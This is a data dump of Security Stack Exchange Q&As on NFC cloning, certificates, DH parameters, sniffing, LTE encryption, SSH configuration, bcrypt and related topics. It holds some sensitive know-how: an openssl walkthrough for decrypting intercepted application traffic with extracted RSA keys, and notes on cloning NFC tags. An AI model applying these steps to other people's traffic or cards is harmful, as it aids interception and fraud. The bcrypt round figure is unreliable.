","7706"
"How do NFC tags prevent copying?","36765","","<p>Ten years ago, we opened our building's front door with a badge. Five years ago we paid public transports with an RFID card. Today we pay for our bread with the same system and tomorrow we would probably be able to authenticate ourselves with something similar.</p>

<p>Basically, an NFC tag is only a physical support, just as a DVD is. It is easy to imagine how it can be protected against malicious alteration or prevented from being read (i.e. understood) by an unauthorized third party.</p>

<p>However, to prevent it from being cloned as-is (even if encrypted) seems impossible to me.</p>

<p>What prevents me from creating kind of an ISO image of the NFC credit card of my customers, writing it on a blank tag and then using it to buy my cigs?</p>
","<p>That depends on what type of tag you use and what level of protection against cloning you want.</p>

<ol>
<li><p>NFC tags (as defined by the <a href=""http://www.nfc-forum.org"">NFC Forum</a>) have <em>no</em> protection against cloning. Such tags are intended as containers for <em>freely readable</em> data (so called NDEF messages). Anyone could read an NDEF message from one tag and duplicate it to another tag.</p></li>
<li><p>Many NFC tags also contain a unique identifier that is pre-programmed by the tag manufacturer and cannot be modified on <em>normal</em> tags because those memory segments are in read-only memory. Such a unique ID could be used to uniquely identify a tag (i.e. to match the ID against some form of database). This approach has been used by many access control systems in the past (and actually still is!). <strong>However, all data can still be extracted from the tag.</strong> Specialized hardware (e.g. Proxmark, etc) and ready-made tags are often available where an attacker can <em>change</em> the unique identifier. So this is certainly not perfect cloning protection. Nevertheless, some manufacturers still add new cloning protection features that rely on publicly readable (but supposed to be uncopyable) unique identifiers. One such manufacturer is NXP with their signature feature on new NTAG tags. (Basically they add a digital signature over the unique ID to the tag, but nothing prevents an attacker to create a clone that also contains a copy of that <em>static</em> signature.)</p></li>
<li><p>Contactless smartcards/tags that provide communication encryption and shared-key based mutual authentication (e.g. MIFARE DESFire) exist. With this approach, cloning could be prevented by protecting certain data on the tag with a secret password. However if an attacker is able to find out that secret password, nothing prevents the attacker from creating a clone of the tag. Many modern access control systems and closed-loop payment systems use such an approach.</p></li>
<li><p>Contactless tags/smartcards that contain a secret asymmetric key (that cannot be extracted from the card using the available communication interface) and provide a command to sign a cryptographic challenge with that key exist. Many such smartcards are built upon Java Card technology, so they contain a microcontroller that executes some custom application software (written in Java). Most modern EMV-based credit cards use this type of mechanism to prevent cloning.</p></li>
</ol>
","63581"
"What is the actual value of a certificate fingerprint?","36746","","<p>In a x509 digital certificate there is a ""certificate fingerprint"" section. It contains md5, sha1 and sha256. How are these obtained, and during the SSL connection, how are these values checked for?</p>
","<p>The fingerprint, as displayed in the Fingerprints section when looking at a certificate with Firefox or the thumbprint in IE is the hash of the <em>entire</em> certificate in DER form.</p>

<p>If your certificate is in PEM format, convert it to DER with OpenSSL:</p>

<pre><code>openssl x509 -in cert.crt -outform DER -out cert.cer
</code></pre>

<p>Then, perform a SHA-1 hash on it (e.g. with <code>sha1sum1</code>):</p>

<pre><code>sha1sum cert.cer
</code></pre>

<p>This should produce the same result as what you see in the browser. These values are not part of the certificate, rather they are computed from the certificate.</p>

<p>One application of these fingerprints is to validate EV certificates. In this case, the SHA-1 fingerprint of the root EV CA certificate is <a href=""http://hg.mozilla.org/mozilla-central/rev/123160236bf1"">hard-coded in the browser</a> (note that (a) it's the fingerprint of the root cert and (b) it has to match exactly the trust anchors shipped with the version of the browser compiled with those values).</p>

<p>Apart from this, these fingerprints are mostly used for identifying the certificates (for organising them).</p>

<p>It's the actual public keys that are used for the verification of other certificates in the chain. The digest used for signing the certificate is actually not in the certificate (only the resulting signature). See <a href=""http://tools.ietf.org/html/rfc5280#section-4.1"">certificate structure</a>:</p>

<pre><code>   Certificate  ::=  SEQUENCE  {
        tbsCertificate       TBSCertificate,
        signatureAlgorithm   AlgorithmIdentifier,
        signatureValue       BIT STRING  }

   TBSCertificate  ::=  SEQUENCE  {
        version         [0]  EXPLICIT Version DEFAULT v1,
        serialNumber         CertificateSerialNumber,
        signature            AlgorithmIdentifier,
        issuer               Name,
        validity             Validity,
        subject              Name,
        ...
</code></pre>

<p>In this case, the signature value is computed from the DER encoded tbsCertificate (i.e. its content). When the signature algorithm is SHA1 with RSA (for example), a SHA-1 digest is computed and then signed using the RSA private key of the issuer. This SHA-1 digest has nothing to do with the fingerprint has shown by <code>openssl x509 -fingerprint</code> or within the browser, since it's that of the tbsCertificate section only.</p>

<p>There are also a couple of unrelated extensions that can make use of digests, of the public keys this time: <a href=""http://tools.ietf.org/html/rfc3280#section-4.2.1.2"">the Subject Key Identifier and the Authority Key Identifier</a>. These are optional (and within the TBS content of the certificate).</p>
","14345"
"Diffie Hellman parameters still calculating after 24 hours","36703","","<p>I have a fresh install of Arch Linux on a RaspberryPi model B. I'm setting up OpenVPN and using <code>easy-rsa</code> with OpenSSL 1.0.2d to generate initial keys and certificates. All went fine until I ran <code>./build-dh</code>(script <a href=""http://ix.io/jYa"" rel=""noreferrer"">here</a>). It was 24 hours later when I wrote <a href=""https://stackoverflow.com/questions/31662997/diffie-hellman-parameters-still-calculating-after-24-hours"">this</a>.</p>

<p>I have previously configured OpenVPN on other devices and the same RaspberryPi, but under Raspbian. And I don't remember this command ever taking so long. Last time I used 2048 bit key and it took about an hour. Now I'm trying with a 4096 bit key and it's been more than a day. In fact it's been another 12 hours since I reinitiated all my settings, enabled the build-it hardware random number generator and tried again. But it's still ongoing.</p>

<p><code>cat /proc/sys/kernel/random/entropy_avail</code> returns values in the range of 3000-3100.</p>

<p>Does anyone have any previous experience with this? How do I check if it's just not executing in a loop?</p>
","<p>If <code>openssl</code> uses a lot of CPU then it is not blocked waiting for ""entropy"". OpenSSL is actually sane in that respect, and uses a <a href=""https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator"">cryptographically secure PRNG</a> to extend an initial seed into as many bits as it needs.</p>

<p>When you use <code>dhparam</code>, OpenSSL not only generates DH parameters; it also wants to assert his social status by taking care to use for the modulus a so-called ""strong prime"", which is useless for security but requires an awful lot more computational effort. A ""strong prime"" is a prime <em>p</em> such that (<em>p</em>-1)/2 is also prime. The prime generation algorithm looks like this:</p>

<ul>
<li>Generate a random odd integer <em>p</em>.</li>
<li>Test whether <em>p</em> is prime. If not, loop.</li>
<li>Test whether (<em>p</em>-1)/2 is prime. If not, loop.</li>
</ul>

<p>Random odd 4096-bit integers are probability about 1/2000 to be prime, and since both <em>p</em> and (<em>p</em>-1)/2 must be prime, this will need on average generating and testing for primality about <em>4 millions</em> of odd primes. This is bound to take some time.</p>

<p>When going from 2048-bit to 4096-bit, the density of strong primes is divided by 4, and the primality tests will also be about 4 times slower, so if generating a 2048-bit DH modulus takes 1 hour on average, the same machine with the same software will use an average of 16 hours for a 4096-bit DH modulus. This is only <em>averages</em>; each individual generation may be faster or slower, depending on your luck.</p>

<hr>

<p>The reasonable solution would be to add the <code>-dsaparam</code> option.</p>

<pre><code>openssl dhparam -dsaparam -out /etc/ssl/private/dhparam.pem 4096
</code></pre>

<p><a href=""https://wiki.openssl.org/index.php/Manual:Dhparam%281%29#OPTIONS"">This option instructs OpenSSL to produce ""DSA-like"" DH parameters</a> (<em>p</em> is such that <em>p</em>-1 is a multiple of a smaller prime <em>q</em>, and the generator has multiplicative order <em>q</em>). This is considerably faster because it does not need to nest the primality tests, and thus only thousands, not millions, of candidates will be generated and tested.</p>

<p>As far as academics know, DSA-like parameters for DH are equally secure; there is no actual advantage to using ""strong primes"" (the terminology is traditional and does not actually imply some extra strength).</p>

<p>Similarly, you may also use a 2048-bit modulus, which is already very far into the ""cannot break it zone"". The 4096-bit modulus will make DH computations slower (which is not a real problem for a VPN; these occur only at the start of the connection), but won't actually improve security.</p>

<p>To some extent, a 4096-bit modulus may woo auditors, but auditors are unlikely to be much impressed by a Raspberry-Pi, which is way too cheap anyway.</p>
","95184"
"Is there a way to sniff packets of a remote IP address?","36626","","<p>I would like to know if sniffing packets of a remote  IP address is possible at all, if yes I would like to know:</p>

<ul>
<li>what is the success rate, I mean how much percent of the packets you would capture?</li>
<li>What are the benefits of securing the local LAN if someone can capture all the packets from that LAN simply by sniffing the WAN connection?</li>
<li>What are the ways to prevent that, and if there is a way to prevent the attacker from knowing my DNS queries and by that knowing to what web sites I am surfing.</li>
</ul>
","<p>If you have control over the network, you can sniff traffic remotely by using a vlan as the destination for a span port and then trunking that to where you need it. You can do this over routed networks as well using GRE tunnels but you must control the network. <br><br>
1) If you have control of the network you should be able to capture 100%<br><br>
2) You can encrypt WAN connections using IPSec either from host to host or at the routers that connect to the service provider to prevent the service provider from viewing the data.<br><br>
3) This sounds more like you are worried about spyware on your workstation. If you have malware on the box, it really doesn't matter what else you do. You need to clean the box.</p>
","9642"
"Why is 'avast! Web/Mail Shield Root' listed as CA for google.com?","36571","","<p>I just noticed something weird in my browser: the certificate for <code>www.google.com</code> has been issued by <code>avast! Web/Mail Shield Root</code>. Should I be worried? I am using avast! Antivirus so it's probably a built-in feature, but I don't know why this is happening and what the benefits/risks are.</p>

<p><img src=""https://i.imgur.com/KIFl7Qf.png"" alt=""Screenshot of the certificate tree""></p>
","<p>The whole goal of HTTPS is to prevent eavesdropping so that anyone monitoring your web traffic can't see what you're sending. As useful as it is, HTTPS presents a bit of a problem to antivirus software because when you visit sites over an encrypted connection, your antivirus software cannot see what sites you're visiting or what files you're downloading, at least until the download finishes. This presents a risk because if you download a virus, the antivirus software won't know about it until the download is finished and the virus is already saved to your hard drive, allowing criminals to bypass the ""live defense"" features of AV by simply hosting the malware on an HTTPS site. </p>

<p>The solution that many antivirus programs use is to install its own SSL certificate as a root certificate so that it can essentially <a href=""https://en.wikipedia.org/wiki/Man-in-the-middle_attack"">man-in-the-middle</a> all HTTPS traffic to scan for malware. I'm guessing this is what avast! is doing.</p>

<p>Whether this behavior presents additional security issues is debatable but I don't think it's something you need to be deeply concerned about - after all, your own antivirus software is doing the man-in-the-middling, not a malicious party. If it worries, you, you can disable this behavior - go to Settings>Active Protection>Web Shield>click on ""customize"" and tick the box next to ""Disable HTTPS scanning."" If you do this, avast! won't be able to proactively block malware on HTTPS sites.</p>
","73481"
"How is 4G LTE encrypted?","36493","","<p>After a few quick searches for 3G security I was able to learn that this standard uses the <a href=""http://en.wikipedia.org/wiki/3G#Security"">KASUMI block cipher</a>, of which several weaknesses have been identified (although apparently none of practical use in decrypting 3G traffic?). Anyway, this made me curious - what kinds of security measures are in place for 4G LTE?</p>
","<p>Information regarding the current implementation of ""4G"" LTE, as well as the soon to be deployed true 4G LTE-A, can be found at the European Telecommunications Standards Institute (ETSI) <a href=""http://www.etsi.org/WebSite/OurServices/Algorithms/3gppalgorithms.aspx"" rel=""nofollow"">website</a> and <a href=""http://portal.etsi.org/portal/server.pt/community/home/312"" rel=""nofollow"">portal</a>.</p>

<p>3G networks use the KASUMI block cipher with the UEA1 confidentiality and UIA1 integrity algorithms. As you said, there have been several demonstrated weaknesses, which has prompted the use of a new cipher / algorithm.</p>

<p>The 4G LTE successor is the <a href=""http://www.gsma.com/aboutus/wp-content/uploads/2014/12/snow3gspec.pdf"" rel=""nofollow"">SNOW 3G stream cipher</a> and the <a href=""http://serving.webgen.gsm.org/5926DA9A-2DD6-48E7-BAD4-50D4CD3AF30A/assets/uea2uia2d1v21.pdf"" rel=""nofollow"">UEA2 confidentiality and UIA2 integrity algorithms</a>. To quote the specs page:</p>

<blockquote>
  <p>SNOW 3G is a word-oriented stream cipher that generates a sequence of
  32-bit words under the control of a 128-bit key and a 128-bit
  initialisation variable. These words can be used to mask the
  plaintext. First a key initialisation is performed, i.e. the cipher is
  clocked without producing output, see 4.1. Then with every clock tick
  it produces a 32-bit word of output.</p>
</blockquote>
","21400"
"Creating user specific authentication methods in SSH","36412","","<ol>
<li>I have configured sshd on an Ubuntu server to use key authentication and it is working fine. </li>
<li>I had to disable password authentication for key authentication to work. </li>
<li>Server is always accessed via remote terminals or putty.</li>
</ol>

<p>Now all user accounts are able to login with the authentication key and passphrase. But now I want to create only one new user without key authentication. So how should I go about doing this in such a way that does not hamper other users who are using key authentication.</p>
","<p>You can use <code>Match</code> in <a href=""http://unixhelp.ed.ac.uk/CGI/man-cgi?sshd_config%205"" rel=""noreferrer""><code>sshd_config</code></a> to select individual users to alter the <code>PasswordAuthentication</code> directive for. Enter these <code>Match</code> rules at the <strong>bottom</strong> of <a href=""http://unixhelp.ed.ac.uk/CGI/man-cgi?sshd_config%205"" rel=""noreferrer""><code>sshd_config</code></a> file ( generally <code>/etc/ssh/sshd_config</code> )</p>

<pre><code>Match User root,foo,bar
    PasswordAuthentication no
Match User Rishee
    PasswordAuthentication yes
</code></pre>

<p>This would give root, foo and bar key authentication, and Rishee password authentication.</p>

<p>An alternative is to match by negation, like this:</p>

<pre><code>PasswordAuthentication no
Match User *,!root
    PasswordAuthentication yes
</code></pre>

<p>In this case, everyone except root gets password authentication.</p>

<p><em>Note: The <code>*,</code> syntax is necessary, as wildcard and negation syntax is only parsed in comma-separated lists.</em></p>

<p>You can also match by group:</p>

<pre><code>Match Group usergroup
    PasswordAuthentication no
</code></pre>

<p><a href=""http://linux.die.net/man/5/sshd_config"" rel=""noreferrer"">Reason</a> for entering <code>Match</code> at the bottom of the file:</p>

<blockquote>
  <p>If all of the criteria on the Match line are satisfied, the keywords on the following lines override those set in the global section of the config file, until either another >Match line or the end of the file</p>
</blockquote>
","18038"
"How to get public key of a secure webpage?","36387","","<p>How can I get the public key of a webpage like verisign , etc. using HTTPS protocol?</p>
","<p>This command will show you the certificate (use <code>-showcerts</code> as an extra parameter if you want to see the full chain):</p>

<pre><code>openssl s_client -connect the.host.name:443
</code></pre>

<p>This will get the certificate and print out the public key:</p>

<pre><code>openssl s_client -connect the.host.name:443 | openssl x509 -pubkey -noout
</code></pre>

<p>If you want to dig further, <a href=""https://stackoverflow.com/a/3117100/372643"">this question</a> might be of interest.</p>
","16091"
"Is it good practice to send passwords in separate emails, and why?","36140","","<p>I have heard from different people and in different places that if I send an encrypted file to someone else, I should send them the password in a separate email; but why? If someone is sniffing, they will capture both and if the inbox is compromised, they will capture both. But apparently, it's ""best practice"" to send it separately.</p>

<p>Now personally, I would send a password via other means, such as a phone call. What would you guys recommend?</p>
","<p>There is added noise to the channel if you send them separately, assuming there is a delay in sending the second email the attacker would have to listen for a longer period of time and filter more content. It is simply a little bit safer than sending everything in the same package, think of ordering a safe box and shipping the keys along with it, its basically the same idea.</p>

<p>You are right in thinking that sending the password via a different channel (sms, phone, etc) is more secure, however it also requires more management and collection of more information, the logistics of doing it come with an added cost.</p>
","94105"
"Decrypt from cipher text encrypted using RSA","36110","","<p>I am sniffing a client side application traffic and I found some encrypted data. I am not able to decrypt it. Information which I have is</p>

<p>Public Key:</p>

<pre><code>MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgHfIm5pYrEMUuJUevmED6bUFx8p9G/5vF+ia+Qnrn8OeMpIJ/KS2nqDLxXx/ezNKlFArWK1Wer4diwQJ2cdiCqNorubAgnOXMV+/FsiATQjMT2E2lI9xUWqqNq+PfgyCPILRliNHT/j2qOvAOHmf3a1dP8lcpvw3x3FBBKpqtzqJAgMBAAE=
</code></pre>

<p>Private Key:</p>

<pre><code>MIICWAIBAAKBgHfIm5pYrEMUuJUevmED6bUFx8p9G/5vF+ia+Qnrn8OeMpIJ/KS2nqDLxXx/ezNKlFArWK1Wer4diwQJ2cdiCqNorubAgnOXMV+/FsiATQjMT2E2lI9xUWqqNq+PfgyCPILRliNHT/j2qOvAOHmf3a1dP8lcpvw3x3FBBKpqtzqJAgMBAAECgYAJ1ykxXOeJ+0HOvl/ViITCol7ve6e5F1dXfKPI9NqDL5Pn+3oN7hLKEvN+btqoNBBLJcR7OQeMZtDs3AJQJvXIqN4UJUBf6fUshhdf9Y5MSpSqAjlqLjted2uw8xuL8gDmOYWV0yjeivvb4Qf7Vl7jAJSBwnlVsGCKmmBXDn+EoQJA63MnjKX1kWVb44HmXX+IDmgTQE6Ezpqzxbjf7ySdxYLb4yfZR+i5oEE+xtqEO5xR4vkEV5s1MuXjNdJHTkc2XwJAgj0HsrIGFw2DgyWF2Rc1w5BbtXH0+GrLTP6+kOuLw1eAZbDjQghzRGmhtdrl38ZtYZMdsrxE2HXDihsdjj2oFwJAl6470FQp+1z88XgB3EIIeJ97p3XuANuQ7NPJD9ra+R7wYUqOo9C9pQvjUV/8yBpQdpRNw9JtVzjaQxYQcdFWqQJAALclG64uqmHAny/NlGu0N+bLGiwOFG9BvqKHmXQxyFjqs6RNG0fAmleaM82IBbqpTyfnudue5TGAaXnMp8Ne8QJAKx/zf5AKPTkqZ7hBQ3IYfx7EbS2f6lelf8BNC+A/iz4dxLgx7AupPtoaKZC0Z6FWpm2s0HNvYhleU3FcAfKRig==
</code></pre>

<p>Encrypted string:</p>

<pre><code>MpTF1+cqa23PdxQ6EoG9E77jfRJGYjORc4omawTg/g8jtUDZNNEeEr3waadTSLjQAfmJO94fpaA145yanoU9khrzCd/nAGIIAVwMC67UnsX+XY6dOEZMo41Z0dU1n42rUtkdXgldHXR1SQXaeDyjRnMj/mMMreNdykl8b4vNVPk=
</code></pre>

<p>I am able to retrieve all the keys, But I am not able to  view encrypted content. Help me to decrypt with procedures.</p>
","<p>Start with saving the three parts respectively to <code>pub.b64</code>, <code>priv.b64</code> and <code>blob.b64</code>:</p>

<pre><code>$ base64 -d &lt; pub.b64 | openssl asn1parse -inform DER -i

    0:d=0  hl=3 l= 158 cons: SEQUENCE
    3:d=1  hl=2 l=  13 cons:  SEQUENCE
    5:d=2  hl=2 l=   9 prim:   OBJECT            :rsaEncryption
   16:d=2  hl=2 l=   0 prim:   NULL
   18:d=1  hl=3 l= 140 prim:  BIT STRING
</code></pre>

<p>Clearly not an X.509v3 certificate. No matter, we don't need that to decrypt. <code>openssl dumpasn1</code> isn't up to the heavy lifting here, try Peter Gutmann's <a href=""http://www.cs.auckland.ac.nz/~pgut001/"" rel=""nofollow noreferrer""><code>dumpasn1</code></a> to peek inside the bit string:</p>

<pre><code>$ base64 -d &lt; pub.b64 &gt; pub.der
$ dumpasn1 -al pub.der

   0  158: SEQUENCE {
   3   13:   SEQUENCE {
   5    9:     OBJECT IDENTIFIER rsaEncryption (1 2 840 113549 1 1 1)
         :       (PKCS #1)
  16    0:     NULL
         :     }
  18  140:   BIT STRING, encapsulates {
  22  136:     SEQUENCE {
  25  128:       INTEGER
         :         77 C8 9B 9A 58 AC 43 14 B8 95 1E BE 61 03 E9 B5
         :         05 C7 CA 7D 1B FE 6F 17 E8 9A F9 09 EB 9F C3 9E
         :         32 92 09 FC A4 B6 9E A0 CB C5 7C 7F 7B 33 4A 94
         :         50 2B 58 AD 56 7A BE 1D 8B 04 09 D9 C7 62 0A A3
         :         68 AE E6 C0 82 73 97 31 5F BF 16 C8 80 4D 08 CC
         :         4F 61 36 94 8F 71 51 6A AA 36 AF 8F 7E 0C 82 3C
         :         82 D1 96 23 47 4F F8 F6 A8 EB C0 38 79 9F DD AD
         :         5D 3F C9 5C A6 FC 37 C7 71 41 04 AA 6A B7 3A 89
 156    3:       INTEGER 65537
         :       }
         :     }
         :   }
</code></pre>

<p>That's more like it, we have what appears to be a 1024-bit modulus, and a likely public exponent of 65537.</p>

<p>The key is a base64 encoded normal RSA key in DER (binary) format:</p>

<pre><code>$ base64 -d priv.b64 | openssl rsa -inform DER &gt; out.key
writing RSA key
$ cat out.key
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgHfIm5pYrEMUuJUevmED6bUFx8p9G/5vF+ia+Qnrn8OeMpIJ/KS2
nqDLxXx/ezNKlFArWK1Wer4diwQJ2cdiCqNorubAgnOXMV+/FsiATQjMT2E2lI9x
UWqqNq+PfgyCPILRliNHT/j2qOvAOHmf3a1dP8lcpvw3x3FBBKpqtzqJAgMBAAEC
gYAJ1ykxXOeJ+0HOvl/ViITCol7ve6e5F1dXfKPI9NqDL5Pn+3oN7hLKEvN+btqo
NBBLJcR7OQeMZtDs3AJQJvXIqN4UJUBf6fUshhdf9Y5MSpSqAjlqLjted2uw8xuL
8gDmOYWV0yjeivvb4Qf7Vl7jAJSBwnlVsGCKmmBXDn+EoQJBAOtzJ4yl9ZFlW+OB
5l1/iA5oE0BOhM6as8W43+8kncWC2+Mn2UfouaBBPsbahDucUeL5BFebNTLl4zXS
R05HNl8CQQCCPQeysgYXDYODJYXZFzXDkFu1cfT4astM/r6Q64vDV4BlsONCCHNE
aaG12uXfxm1hkx2yvETYdcOKGx2OPagXAkEAl6470FQp+1z88XgB3EIIeJ97p3Xu
ANuQ7NPJD9ra+R7wYUqOo9C9pQvjUV/8yBpQdpRNw9JtVzjaQxYQcdFWqQJAALcl
G64uqmHAny/NlGu0N+bLGiwOFG9BvqKHmXQxyFjqs6RNG0fAmleaM82IBbqpTyfn
udue5TGAaXnMp8Ne8QJAKx/zf5AKPTkqZ7hBQ3IYfx7EbS2f6lelf8BNC+A/iz4d
xLgx7AupPtoaKZC0Z6FWpm2s0HNvYhleU3FcAfKRig==
-----END RSA PRIVATE KEY-----
</code></pre>

<p>If you decode that key:</p>

<pre><code>$ openssl asn1parse  &lt; out.key
    0:d=0  hl=4 l= 600 cons: SEQUENCE          
    4:d=1  hl=2 l=   1 prim: INTEGER           :00
    7:d=1  hl=3 l= 128 prim: INTEGER           
                      :77C89B9A58AC4314B8951EBE6103E9B505C7CA7D1BFE6F17E89AF9
                       09EB9FC39E329209FCA4B69EA0CBC57C7F7B334A94502B58AD567A
                       BE1D8B0409D9C7620AA368AEE6C0827397315FBF16C8804D08CC4F
                       6136948F71516AAA36AF8F7E0C823C82D19623474FF8F6A8EBC038
                       799FDDAD5D3FC95CA6FC37C7714104AA6AB73A89
  138:d=1  hl=2 l=   3 prim: INTEGER           :010001
  [...snip...]
</code></pre>

<p>and compare with the <code>dumpasn1</code> decoding of the public key, you can see that they share a 1024 bit modulus and exponent, so it looks like they key and cert match. Good.</p>

<p>So, decode your encrypted data:</p>

<pre><code>$ base64 -d blob.b64 &gt; blob
</code></pre>

<p>and decrypt it:</p>

<pre><code>$ openssl rsautl -decrypt -inkey out.key &lt; blob &gt; decrypted
$ hexdump decrypted
0000000 0355 1739 575b 5434 ccc5 bec7 e70a 0d44
0000010 a4a9 11d4 166c 3423 4e36 e657 2fea ef53
</code></pre>

<p>That's 32 bytes (256 bits), quite likely a key used in a symmetric cipher to encrypt more data, since you <a href=""https://security.stackexchange.com/questions/33434/rsa-maximum-bytes-to-encrypt-comparison-to-aes-in-terms-of-security"">can only encrypt relatively small amounts of data with RSA</a></p>

<p>Good luck with the next part ;-)</p>
","36385"
"Specific risks of embedding an HTTPS iframe in an HTTP page","36109","","<p>I need help listing the specific risks of embedding an HTTPS iframe that enables credit card checkout inside of an HTTP page. <a href=""https://security.stackexchange.com/questions/894/are-there-security-issues-with-embedding-an-https-iframe-on-an-http-page"">Are there security issues with embedding an HTTPS iframe on an HTTP page?</a> provides some high-level concerns, but I'm looking to be as specific as possible about potential attack vectors. Click on <a href=""http://www.ninjastandingdesk.com/buy-ninja-standing-desk.html"" rel=""nofollow noreferrer"">Buy Now</a> for a good example of a secure iframe inside of an insecure page, being used today for credit card transactions. Here's what I have so far:</p>

<ul>
<li>Conversion will likely be lower because educated users will know not to enter their credit card number without seeing a green lock in the URL in the browser chrome. (Less knowledgable users may not know that they shouldn't trust a lock appearing inside the browser frame, as in the example above.)</li>
<li>Even if users are comfortable with this approach, it's generally a bad idea to encourage users to enter their credit card number when they don't see an SSL lock confirmation in the URL bar. It is teaching users bad security habits. <a href=""http://www.troyhunt.com/2011/01/ssl-is-not-about-encryption.html"" rel=""nofollow noreferrer"">This post</a> makes the point that SSL is about security more than just encryption and authentication.</li>
<li>An active man in the middle could inject a rogue script into the parent page that could keystroke snoop. I believe this is what the Tunisian government did to <a href=""http://blog.jgc.org/2011/01/code-injected-to-steal-passwords-in.html"" rel=""nofollow noreferrer"">steal</a> dissidents Facebook credentials. (I believe the rogue script would be prevented from accessing the username and password from the secure iframe, but could still access keystrokes). Of course, a more determined government authority could subvert DNS and forge an SSL certificate as well, as the <a href=""http://www.daemonology.net/blog/2011-09-01-Iran-forged-the-wrong-SSL-certificate.html"" rel=""nofollow noreferrer"">Iranian government</a> apparently did, in which case a secure parent page wouldn't help.</li>
</ul>

<p>I also have this list of unrealistic concerns:</p>

<ul>
<li>Another Javascript object on the unsecure parent page could snoop the contents of the secure iframe. <em>I believe this is no longer possible as long as only browsers IE8 and above are supported.</em></li>
<li>A rogue Javascript object on the parent page could do keystroke logging to capture a user's credit card number. <em>This may be possible, but the risk is not affected by whether the parent page is served via SSL or not. A rogue script could keystroke snoop either way.</em></li>
<li>The user can't see the URL the secure iframe is being served from. <em>With either a secure or insecure parent page, you would need to be a technically-sophisticated user to view the iframe source URL.</em></li>
</ul>

<p>Could you please tell me what other realistic and unrealistic vulnerabilities I'm missing? I have no doubt that the best option is always to embed a secure iframe into a secure parent page. What I'm trying to decide is the relative risks and benefits of enabling a secure iframe inside an insecure page versus the poor user experience of jumping users off of the insecure site where they see the product in order to complete a secure checkout elsewhere.</p>
","<blockquote>
  <p>Click on Buy Now for a good example of a secure iframe inside of an insecure page, being used today for credit card transactions.</p>
</blockquote>

<p>Aside from all the mentioned technical reasons this is a disastrously bad thing, this is explicitly against PCI-DSS requirements. See ‘Navigating DSS 2.0’ requirement 4.1:</p>

<pre><code>When using SSL secured websites, ensure “https” is part of the URL
</code></pre>

<p>The linked interface is in breach of the PCI conditions that merchants sign up to as part of their agreement with their bank. ShopLocket appear to be providing/encouraging a blatantly non-PCI-compliant as well as deeply questionable approach to card processing.</p>
","38339"
"How to find out that a NIC is in promiscuous mode on a LAN?","35891","","<p>How to find out that a NIC is in promiscuous mode on a LAN?</p>
","<p><strong>DNS test</strong> - many packet sniffing tools perform IP address to name lookups to provide DNS names in place of IP addresses. To test this, you must place your network card into promiscuous mode and sends packets out onto the network aimed to bogus hosts. If any name lookups from the bogus hosts are seen, a sniffer might be in action on the host performing the lookups.</p>

<p><strong>ARP Test</strong> - When in promiscuous mode the driver for the network card checks for the MAC address being that of the network card for unicast packets, but only checks the first octet of the MAC address against the value 0xff to determine if the packet is broadcast or not. Note that the address for a broadcast packet is ff:ff:ff:ff:ff:ff. To test for this flaw, if you send a packet with a MAC address of ff:00:00:00:00:00 and the correct destination IP address of the host. After receiving a packet, the Microsoft OS using the flawed driver will respond while in promiscuous mode. Probably it happens just with the default MS driver.</p>

<p><strong>Ether Ping test</strong> - In older Linux kernels when a network card is placed in promiscuous mode every packet is passed on to the OS. Some Linux kernels looked only at the IP address in the packets to determine whether they should be processed or not. To test for this flaw, you have to send a packet with a bogus MAC address and a valid IP address. Vulnerable Linux kernels with their network cards in promiscuous mode only look at the valid IP address. To get a response, an ICMP echo request message is sent within the bogus packet leading to vulnerable hosts in promiscuous mode to respond.</p>

<p>Maybe there are more, the DNS test for me is the most reliable </p>
","3631"
"Recommended # of rounds for bcrypt","35843","","<p>What is nowadays (July 2012) the recommended number of bcrypt rounds for hashing a password for an average website (storing only name, emailaddress and home address, but no creditcard or medical information)?</p>

<p>In other words, what is the current capability of the bcrypt password cracking community? Several bcrypt libraries use 12 rounds (2^12 iterations) as the default setting. Is that the recommended workfactor? Would 6 rounds not be strong enough (which happens to be the limit for client-side bcrypt hashing in Javascript, see also <a href=""https://security.stackexchange.com/q/17129/11197"">Challenging challenge: client-side password hashing and server-side password verification</a>)?</p>

<p>I have read answer <a href=""https://security.stackexchange.com/a/3993/11197"">https://security.stackexchange.com/a/3993/11197</a> which gives an in-depth discussion how to balance the various factors (albeit for PBKDF2-SHA256). However, I am looking for an actual number. A rule of thumb.</p>
","<p>I think the answer to all of your questions is already contained in <a href=""https://security.stackexchange.com/a/3993/971"">Thomas Pornin's answer</a>.  You linked to it, so you presumably know about it, but I suggest that you read it again.</p>

<p>The basic principles are: don't choose a number of rounds; instead, choose the amount of time password verification will take on your server, then calculate the number of rounds based upon that.  You want verification to take as long as you can stand.</p>

<p>For some examples of concrete numbers, see Thomas Pornin's answer.  He suggests a reasonable goal would be for password verification/hashing to take 241 milliseconds per password. <em>(Note: Thomas initially wrote ""8 milliseconds"", which is wrong -- this is the figure for a patience of one day instead of one month.)</em> That still lets your server verify 4 passwords per second (more if you can do it in parallel).  Thomas estimates that, if this is your goal, about 20,000 rounds is in the right ballpark.</p>

<p>However, the optimal number of rounds will change with your processor.  Ideally, you would benchmark how long it takes on your processor and choose the number accordingly.  This doesn't take that long; so for best results, just whip up the script and work out how many rounds are needed to ensure that password hashing takes about 240 milliseconds on your server (or longer, if you can bear it).</p>
","17238"
"SSL Client Certificate authentication","35797","","<p>Is it possible to make a program which uses client certificate authentication with only public and private key (I have not generated any certificate, I have only public and private key).</p>

<p>Simply, I want to make authentication on server with client certificate authentication. But it is hard to make client certificate programmatically.</p>

<p>I want to make client certificate authentication with only public and private key (I have only public and private key, no certificate).</p>

<p><strong>It is possible to send server public key instead of client certificate for client certificate authentication ?</strong></p>
","<p>Certificates are just the public key with some added context. The name of the key, signatures, usage guidelines, etc. SSL/TLS <strong>depends</strong> on that context. Otherwise the host you're connecting to won't know whether the key genuinely belongs to you or not. The SSL trust mechanism is built on the concept of explicitly trusted certificates and then the implicitly trusted certificates that they sign.</p>

<p>But if you're not using SSL or TLS, then encryption can still happen without it, but trust has to happen a different way. SSH is a good example of this: SSH still uses public and private keys, but since there is no hierarchy of signatures, the added information that certificates provide wouldn't be useful, so the key is sent bare. Instead, the client asks you whether or not to trust the server's public key the first time it connects, and every time thereafter checks to see if the public key matches what it saw last time.  <strong>This can happen because SSH does not use SSL or TLS for its encryption.</strong></p>

<p>But if you're using the SSL protocol, the protocol dictates that the public key must be presented with the added context of the certificate. That is, the certificate is the container that the public key must be placed in for SSL to use it.</p>

<p>If you have the private key, it's trivial to create a self-signed certificate using a tool like OpenSSL.</p>
","40018"
